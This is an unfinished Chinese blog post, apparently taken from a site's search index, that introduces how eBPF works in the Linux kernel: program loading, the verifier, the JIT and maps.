<h2 id="1-eBPF"><a href="#1-eBPF" class="headerlink" title="1. eBPF"></a>1. eBPF</h2><p>BPF（Berkeley Packet Filter）是一种包过滤器，是很早就有的内核特性，最早可以追溯到1992年。由于其优良的特性，所有UNIX系统都将BPF作为网络过滤的首选技术，比如我们熟悉的Tcpdump，其底层就是依赖BPF实现的包过滤。</p>
<p>2014年，Alexei Starovoitov对BPF进行了彻底的改造，并增加了新的功能，改善了性能，新版本被命名为eBPF(extended BPF)。</p>
<p>在eBPF中，开发者可以在用户空间编写eBPF程序，并将其加载到内核空间执行，不用重新编译内核。</p>
<h3 id="1-1-eBPF原理"><a href="#1-1-eBPF原理" class="headerlink" title="1.1 eBPF原理"></a>1.1 eBPF原理</h3><p>Linux内核是一个事件驱动的系统设计，这意味着所有操作都是基于事件来描述和执行的。打开文件、CPU执行指令、接收网络数据包都是事件。eBPF可以在内核中检查这些事件的信息源，并且编写eBPF程序来处理触发该事件的代码。</p>
<p>开发者可以使用C语言或者Python等其他高级语言编写自己的eBPF程序，然后通过LLVM或者GNU、Clang等编译器，将其编译成eBPF字节码。Linux提供了一个bpf()系统调用，通过bpf()系统调用，将这段编译好的字节码传入内核空间。</p>
<p><img src="../images/pic/k8s14.jpg"> </p>
<p>传入内核后，先用Verifier组件进行安全测试，测试之后通过JIT编译为机器码。这样就可以在eBPF指定的附着点上执行操作逻辑了。</p>
<p>eBPF通过MAP数据结构进行数据存储和管理，eBPF将产生的数据通过指定的MAP数据类型进行存储，用户空间的应用程序作为消费者通过bpf()系统调用，从MAP数据结构中读取数据并进行存储和处理。这就是一个完整的eBPF程序的流程。</p>
<h2 id="1-2-eBPF程序类型"><a href="#1-2-eBPF程序类型" class="headerlink" title="1.2 eBPF程序类型"></a>1.2 eBPF程序类型</h2><p>我们可以简单地将eBPF程序的类型分为两个方面：追踪（Tracing）和网络（Networking）。</p>
<p><strong>1. 追踪</strong></p>
<p>未完待续……</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://cloudnative.to/blog/bpf-intro">https://cloudnative.to/blog/bpf-intro</a></p>
</li>
<li><p>《云原生安全攻防实践与体系构建》</p>
</li>
</ul>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>云原生安全</tag>
      </tags>
  </entry>
</search>
